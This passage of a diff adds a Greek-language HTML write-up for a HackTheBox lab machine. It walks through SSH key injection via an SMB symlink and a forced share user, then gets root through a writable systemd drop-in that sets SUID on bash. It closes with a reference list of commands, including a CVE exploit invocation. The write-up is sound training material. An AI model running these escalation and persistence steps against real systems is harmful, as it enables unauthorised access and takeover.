+    Το <strong>print command</strong> επιβεβαιώνει την αλυσίδα CVE-2026-4480 — το <code>%J</code> προσγειώνεται unescaped στην εντολή shell. Πιο χρήσιμο τώρα: το share <strong>transfer</strong> τρέχει τα πάντα σαν <code>marcus</code> (<code>force user</code>) και ακολουθεί symlinks σε ολόκληρα τα όρια share (<code>wide links = yes</code>). Κάθε αρχείο που γράφεται μέσα στο <code>transfer</code> ανήκει στον marcus, και ένα symlink μέσα σε αυτό μπορεί να δείχνει οπουδήποτε στον δίσκο.
+  </div>
+
+  <!-- ══ LATERAL 2 ══ -->
+  <h2>Πλάγια Κίνηση — SSH Key Injection μέσω SMB Symlink</h2>
+
+  <p>Ο scott μπορεί να γράψει στο <code>/srv/transfer</code> απευθείας στο filesystem. Το να φυτέψεις εκεί ένα symlink που δείχνει στο home directory του marcus μετατρέπει το share SMB σε ένα write primitive σαν marcus:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">symlink + smbclient upload</span>
+    </div>
+    <div class="term-body"><span class="pg">scott@abducted:~$ </span><span class="pc">ln -s /home/marcus /srv/transfer/marcus</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/transfer -U 'scott%iXzvcib3SrpZ'</span>
+
+<span class="pd">smb: \&gt; </span><span class="pc">cd marcus</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">mkdir .ssh</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">cd .ssh</span>
+<span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">put id_rsa.pub authorized_keys</span>
+<span class="po">putting file id_rsa.pub as \marcus\.ssh\authorized_keys</span></div>
+  </div>
+
+  <p>Το SSH αρνείται κλειδιά που είναι world-readable, οπότε το mode πρέπει να αφαιρεθεί μέσω του share πριν γίνει αποδεκτό:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smbclient setmode + ssh</span>
+    </div>
+    <div class="term-body"><span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">setmode authorized_keys a-r</span>
+<span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">cd ..</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">setmode .ssh a-r+d</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh -i id_rsa marcus@abducted.htb</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">id</span>
+<span class="pg">uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),</span><span class="py">1000(operators)</span></div>
+  </div>
+
+  <div class="alert alert-success">SSH ως <strong>marcus</strong> — και μια συμμετοχή στο <code>operators</code> που αξίζει να κυνηγήσεις.</div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege Escalation σε Root — systemd Drop-in</h2>
+
+  <p>Τι πρόσβαση δίνει πραγματικά εκείνη η ομάδα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">marcus — operators group</span>
+    </div>
+    <div class="term-body"><span class="pg">marcus@abducted:~$ </span><span class="pc">find / -group operators 2&gt;/dev/null</span>
+<span class="py">/etc/systemd/system/smbd.service.d</span></div>
+  </div>
+
+  <p>Το <code>operators</code> κατέχει τον φάκελο drop-in για το unit systemd <code>smbd</code>. Τα drop-ins προσθέτουν επιπλέον directives πάνω σε μια υπηρεσία χωρίς να αγγίζουν το base unit file — ένα <code>ExecStartPre</code> εδώ τρέχει σαν root τη στιγμή που η υπηρεσία κάνει restart:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">malicious drop-in → SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pg">marcus@abducted:~$ </span><span class="pc">cat &gt; /etc/systemd/system/smbd.service.d/privesc.conf &lt;&lt; 'EOF'
+[Service]
+ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
+EOF</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">systemctl daemon-reload &amp;&amp; systemctl restart smbd</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">bash -p</span>
+<span class="pr">bash-5.2#</span> <span class="pc">whoami</span>
+<span class="pr">root</span>
+<span class="pr">bash-5.2#</span> <span class="pc">cat /root/root.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 Root flag πιάστηκε. Το <code>ExecStartPre</code> έτρεξε σαν root στο restart της υπηρεσίας, όρισε το bit SUID στο <code>/bin/bash</code>, και το <code>bash -p</code> διατήρησε τα privileges σε ένα shell root.</div>
+
+  <!-- ══ SUMMARY ══ -->
+  <h2>Περίληψη</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Τεχνικη</th><th>Εργαλειο</th></tr>
+    <tr><td>Foothold</td><td>CVE-2026-4480 — Samba <code>%J</code> print job shell injection, unauth</td><td>python3-samba</td></tr>
+    <tr><td>Κλοπή credentials</td><td>Obfuscated password rclone σε world-readable config</td><td>rclone reveal</td></tr>
+    <tr><td>Πλάγια κίνηση</td><td>Επαναχρησιμοποίηση password (svc-backup → scott)</td><td>ssh</td></tr>
+    <tr><td>Πλάγια κίνηση</td><td>SMB <code>force user</code> + symlink <code>wide links</code> → key injection</td><td>smbclient</td></tr>
+    <tr><td>Root</td><td>Group-writable systemd drop-in, <code>ExecStartPre</code> σαν root</td><td>systemctl</td></tr>
+  </table>
+
+  <!-- ══ COMMAND REF ══ -->
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">γρήγορη αναφορά</span>
+    </div>
+    <div class="term-body"><span class="pco"># Καταμέτρηση</span>
+<span class="pc">smbclient -L //&lt;IP&gt; -N</span>
+<span class="pc">rpcclient -U "" -N &lt;IP&gt;</span>
+
+<span class="pco"># Foothold CVE-2026-4480</span>
+<span class="pc">python3 cve-2026-4480.py -r &lt;IP&gt; -l &lt;LHOST&gt; -p &lt;LPORT&gt;</span>
+
+<span class="pco"># Ανάκτηση credential</span>
+<span class="pc">rclone reveal &lt;obfuscated-string&gt;</span>
+
+<span class="pco"># SMB symlink key injection</span>
+<span class="pc">ln -s /home/&lt;user&gt; /srv/transfer/&lt;user&gt;</span>
+<span class="pc">smbclient //&lt;IP&gt;/transfer -U '&lt;user&gt;%&lt;pass&gt;'</span>
+<span class="pc">  put id_rsa.pub authorized_keys</span>
+<span class="pc">  setmode authorized_keys a-r</span>
+
+<span class="pco"># systemd drop-in privesc</span>
+<span class="pc">find / -group &lt;group&gt; 2&gt;/dev/null</span>
+<span class="pc">systemctl daemon-reload &amp;&amp; systemctl restart &lt;unit&gt;</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
